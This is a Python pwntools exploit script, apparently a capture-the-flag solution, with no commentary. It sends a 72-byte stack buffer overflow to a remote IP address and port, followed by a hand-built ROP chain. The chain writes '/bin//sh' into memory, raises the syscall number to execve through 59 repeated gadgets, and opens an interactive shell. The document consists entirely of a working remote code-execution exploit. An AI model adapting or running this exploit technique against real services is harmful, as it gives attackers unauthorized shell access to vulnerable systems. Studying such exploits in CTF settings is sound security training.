from pwn import *
from struct import pack

#p = process('./chall')
p = remote('40.81.29.254', 8092)

payload = b'A' * 72

payload += pack('<Q', 0x0000000000409eae) 
payload += pack('<Q', 0x00000000004c50e0) 
payload += pack('<Q', 0x0000000000447b67) 
payload += b'/bin//sh'
payload += pack('<Q', 0x0000000000449fe5) 
payload += pack('<Q', 0x0000000000409eae) 
payload += pack('<Q', 0x00000000004c50e8) 
payload += pack('<Q', 0x000000000043cd50) 
payload += pack('<Q', 0x0000000000449fe5) 
payload += pack('<Q', 0x0000000000401e3f) 
payload += pack('<Q', 0x00000000004c50e0) 
payload += pack('<Q', 0x0000000000409eae) 
payload += pack('<Q', 0x00000000004c50e8) 
payload += pack('<Q', 0x000000000047eceb) 
payload += pack('<Q', 0x00000000004c50e8) 
payload += pack('<Q', 0x4141414141414141) 
payload += pack('<Q', 0x000000000043cd50) 

for _ in range(59):
    payload += pack('<Q', 0x0000000000470d50)

payload += pack('<Q', 0x0000000000401bf4) 

p.sendlineafter(b"Transmit message:\n", payload)

p.interactive()
